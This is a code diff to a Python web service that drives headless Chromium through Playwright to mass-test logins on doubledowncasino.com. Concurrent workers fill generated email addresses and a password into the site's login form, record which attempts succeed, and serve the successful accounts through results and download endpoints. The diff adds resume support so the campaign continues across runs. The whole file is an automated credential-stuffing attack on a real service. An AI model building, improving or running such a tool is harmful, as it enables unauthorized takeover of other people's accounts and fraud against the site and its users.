@@ -78,44 +78,76 @@ async def _async_scan_worker(job_id, concurrency):
     sync_db = sync_client[db_name]
 
     all_emails = generate_all_emails()
-    total = len(all_emails)
+
+    # RESUME: Get already-tested emails from DB and skip them
+    already_tested = set()
+    for doc in sync_db.login_results.find({}, {"email": 1}):
+        already_tested.add(doc["email"])
+
+    remaining_emails = [e for e in all_emails if e["email"] not in already_tested]
+    total_remaining = len(remaining_emails)
+    total_all = len(all_emails)
+    already_done = len(already_tested)
+
+    # Get current success count from DB
+    current_success = sync_db.login_results.count_documents({"status": "success"})
 
     active_jobs[job_id] = {
         "status": "running",
-        "total": total,
-        "tested": 0,
-        "successful": 0,
-        "failed": 0,
+        "total": total_all,
+        "already_tested": already_done,
+        "tested": already_done,
+        "successful": current_success,
+        "failed": already_done - current_success,
+        "remaining": total_remaining,
         "current_email": "",
         "started_at": datetime.now(timezone.utc).isoformat()
     }
 
-    logger.info(f"Scan {job_id}: {total} emails, {concurrency} concurrent workers")
+    # Save scan job to DB for persistence
+    sync_db.scan_jobs.update_one(
+        {"job_id": job_id},
+        {"$set": {
+            "job_id": job_id,
+            "status": "running",
+            "total": total_all,
+            "already_tested": already_done,
+            "remaining": total_remaining,
+            "started_at": datetime.now(timezone.utc).isoformat()
+        }},
+        upsert=True
+    )
+
+    logger.info(f"Scan {job_id}: {total_remaining} remaining of {total_all} total ({already_done} already tested, {current_success} successful)")
+
+    if total_remaining == 0:
+        active_jobs[job_id]["status"] = "completed"
+        active_jobs[job_id]["completed_at"] = datetime.now(timezone.utc).isoformat()
+        sync_db.scan_jobs.update_one({"job_id": job_id}, {"$set": {"status": "completed", "completed_at": datetime.now(timezone.utc).isoformat()}})
+        sync_client.close()
+        return
 
     try:
         async with async_playwright() as p:
             browser = await p.chromium.launch(headless=True)
 
-            # Create worker semaphore
             sem = asyncio.Semaphore(concurrency)
-            email_idx = [0]  # mutable counter
+            email_idx = [0]
 
             async def worker(worker_id):
-                """Each worker gets its own browser context and reuses it for sequential logins."""
                 context = await browser.new_context(viewport={'width': 1920, 'height': 1080})
                 page = await context.new_page()
 
                 while True:
-                    # Get next email
                     async with sem:
-                        if email_idx[0] >= total:
+                        if email_idx[0] >= total_remaining:
                             break
                         if active_jobs.get(job_id, {}).get("status") != "running":
                             break
                         idx = email_idx[0]
                         email_idx[0] += 1
 
-                    item = all_emails[idx]
+                    item = remaining_emails[idx]
                     email = item["email"]
                     active_jobs[job_id]["current_email"] = email
 
@@ -129,8 +161,10 @@ async def _async_scan_worker(job_id, concurrency):
                     else:
                         active_jobs[job_id]["failed"] += 1
 
+                    active_jobs[job_id]["remaining"] = total_remaining - email_idx[0]
+
                     sync_db.login_results.update_one(
-                        {"email": email, "job_id": job_id},
+                        {"email": email},
                         {"$set": {
                             "email": email,
                             "prefix": item["prefix"],
@@ -147,7 +181,6 @@ async def _async_scan_worker(job_id, concurrency):
                 except Exception:
                     pass
 
-            # Run multiple workers concurrently
             tasks = [asyncio.create_task(worker(i)) for i in range(concurrency)]
             await asyncio.gather(*tasks, return_exceptions=True)
             await browser.close()
@@ -162,45 +195,56 @@ async def _async_scan_worker(job_id, concurrency):
     if active_jobs[job_id]["status"] == "running":
         active_jobs[job_id]["status"] = "completed"
     active_jobs[job_id]["completed_at"] = datetime.now(timezone.utc).isoformat()
-    logger.info(f"Scan {job_id} done: {active_jobs[job_id]['successful']}/{active_jobs[job_id]['tested']} successful")
+
+    # Persist final status
+    try:
+        s_client = MongoClient(mongo_url)
+        s_db = s_client[db_name]
+        s_db.scan_jobs.update_one(
+            {"job_id": job_id},
+            {"$set": {
+                "status": active_jobs[job_id]["status"],
+                "tested": active_jobs[job_id]["tested"],
+                "successful": active_jobs[job_id]["successful"],
+                "failed": active_jobs[job_id]["failed"],
+                "completed_at": active_jobs[job_id].get("completed_at")
+            }}
+        )
+        s_client.close()
+    except Exception:
+        pass
+
+    logger.info(f"Scan {job_id} done: {active_jobs[job_id]['successful']} successful / {active_jobs[job_id]['tested']} tested")
 
 
 async def test_login_fast(page, email, password):
-    """Test a single login by navigating to DDC and going through the flow.
-    Reuses the same page for efficiency."""
     try:
-        # Navigate to DDC
         await page.goto('https://www.doubledowncasino.com', wait_until='domcontentloaded', timeout=20000)
         await page.wait_for_timeout(2500)
 
-        # Click Play Now
         play_btn = await page.query_selector('img[src*="playnow"]')
         if play_btn:
             await play_btn.click(force=True)
             await page.wait_for_timeout(2000)
 
-        # Click Email Connect
         try:
             await page.click('img[src*="email_connect"]', force=True, timeout=5000)
             await page.wait_for_timeout(800)
         except Exception:
             return False
 
-        # Click Login tab
         try:
             await page.click('img[src*="email_dailog_login"]', force=True, timeout=3000)
             await page.wait_for_timeout(400)
         except Exception:
             pass
 
-        # Fill credentials
         try:
             await page.fill('#emailID', email, timeout=3000)
             await page.fill('#pw', password, timeout=3000)
         except Exception:
             return False
 
-        # Track auth result
         auth_result = {"success": None}
         auth_event = asyncio.Event()
 
@@ -217,14 +261,12 @@ async def test_login_fast(page, email, password):
 
         page.on('response', handle_response)
 
-        # Click login
         try:
             await page.click('img[src*="green_login"]', force=True, timeout=3000)
         except Exception:
             page.remove_listener('response', handle_response)
             return False
 
-        # Wait for auth response
         try:
             await asyncio.wait_for(auth_event.wait(), timeout=12.0)
         except asyncio.TimeoutError:
@@ -246,18 +288,27 @@ class ScanRequest(BaseModel):
 
 @router.post("/start")
 async def start_scan(request: ScanRequest = ScanRequest()):
+    # Check if a scan is already running in memory
     for jid, job in active_jobs.items():
         if job["status"] == "running":
             return {"message": "Scan already running", "job_id": jid, "status": job}
 
     job_id = str(uuid.uuid4())
+
+    # DO NOT delete previous results — resume from where we left off
+    already_tested = await db.login_results.count_documents({})
     total = count_total_emails()
-    await db.login_results.delete_many({})
 
     thread = threading.Thread(target=run_scan_worker, args=(job_id, request.batch_size), daemon=True)
     thread.start()
 
-    return {"job_id": job_id, "total_emails": total, "status": "started"}
+    return {
+        "job_id": job_id,
+        "total_emails": total,
+        "already_tested": already_tested,
+        "remaining": total - already_tested,
+        "status": "started"
+    }
 
 
 @router.post("/stop")
@@ -271,11 +322,34 @@ async def stop_scan():
 
 @router.get("/status")
 async def get_scan_status():
-    if not active_jobs:
-        return {"status": "idle", "total": count_total_emails()}
-    latest_job_id = max(active_jobs.keys(), key=lambda k: active_jobs[k].get("started_at", ""))
-    job = active_jobs[latest_job_id]
-    return {"job_id": latest_job_id, **{k: v for k, v in job.items() if k != "successful_emails"}}
+    # If there's an active in-memory job, return it
+    if active_jobs:
+        latest_job_id = max(active_jobs.keys(), key=lambda k: active_jobs[k].get("started_at", ""))
+        job = active_jobs[latest_job_id]
+        return {"job_id": latest_job_id, **{k: v for k, v in job.items()}}
+
+    # Otherwise, check DB for persisted stats
+    total = count_total_emails()
+    tested = await db.login_results.count_documents({})
+    successful = await db.login_results.count_documents({"status": "success"})
+
+    # Check for last completed scan job
+    last_job = await db.scan_jobs.find_one({}, sort=[("started_at", -1)])
+
+    return {
+        "status": "idle" if tested == 0 else "resumable",
+        "total": total,
+        "tested": tested,
+        "successful": successful,
+        "failed": tested - successful,
+        "remaining": total - tested,
+        "last_job": {
+            "job_id": last_job["job_id"],
+            "status": last_job["status"],
+            "started_at": last_job.get("started_at"),
+            "completed_at": last_job.get("completed_at")
+        } if last_job else None
+    }
 
 
 @router.get("/results")
@@ -287,6 +361,15 @@ async def get_results(status_filter: str = Query("success"), limit: int = 500):
     total_success = await db.login_results.count_documents({"status": "success"})
     total_tested = await db.login_results.count_documents({})
     return {"results": results, "total_success": total_success, "total_tested": total_tested}
+
+
+@router.post("/reset")
+async def reset_results():
+    """Only use this to deliberately clear all results and start fresh."""
+    await db.login_results.delete_many({})
+    await db.scan_jobs.delete_many({})
+    active_jobs.clear()
+    return {"message": "All results cleared. Next scan will start from the beginning."}
 
 
 @router.get("/download")
